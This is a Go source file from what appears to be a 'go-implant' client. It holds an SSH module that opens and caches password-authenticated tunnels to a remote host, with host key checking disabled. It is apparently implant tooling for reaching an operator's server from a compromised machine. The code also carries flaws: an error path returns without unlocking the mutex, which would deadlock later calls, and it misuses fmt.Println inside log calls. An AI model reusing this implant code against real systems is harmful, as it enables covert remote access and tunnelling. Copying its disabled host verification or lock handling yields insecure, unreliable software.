
package ssh

import (
	"go-implant/client/config"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var mutex = &sync.Mutex{}                 // mutex to guard access to tunnel map
var tunnel = make(map[string]*ssh.Client) // open ssh tunnel

// CreateTunnel creates tunnel thread safely if it does not exist
func CreateTunnel(channel chan struct{}, username string, password string, sshHost string, sshPort int) (*ssh.Client, error) {

	mutex.Lock()

	// if tunnel is not up, open it
	thistunnel, ok := tunnel[sshHost+":"+strconv.Itoa(sshPort)]
	if !ok {

		if config.DEBUG {
			log.Println(fmt.Println("Opening new tunnel"))
		}

		tunnel2, err := openTunnel(username, password, sshHost, sshPort)
		if err != nil {
			return nil, err
		}

		// wait until tunnel gets closed and then remove it from the array
		go func() {
			tunnel2.Wait()
			mutex.Lock()
			delete(tunnel, sshHost+":"+strconv.Itoa(sshPort))
			mutex.Unlock()
		}()

		// wait until channel gets closed and then close the tunnel
		go func() {
			<-channel
			tunnel2.Close()
		}()

		// add this tunnel to the map
		tunnel[sshHost+":"+strconv.Itoa(sshPort)] = tunnel2

		thistunnel = tunnel2

	} else {
		if config.DEBUG {
			log.Println(fmt.Println("There is already an open tunnel we can use"))
		}
	}

	mutex.Unlock()

	return thistunnel, nil
}

// OpenTunnel opens a SSH tunnel to username@sshHost:sshPort
func openTunnel(username string, password string, sshHost string, sshPort int) (*ssh.Client, error) {
	// refer to https://godoc.org/golang.org/x/crypto/ssh for other authentication types
	sshConfig := &ssh.ClientConfig{
		// SSH connection username
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(60) * time.Second,
	}

	// Connect to SSH remote server using serverEndpoint
	serverConn, err := ssh.Dial("tcp", sshHost+":"+strconv.Itoa(sshPort), sshConfig)
	if err != nil {
		if config.DEBUG {
			log.Println(fmt.Printf("Dial INTO remote server error: %s", err))
		}
		return nil, err
	}

	return serverConn, nil
}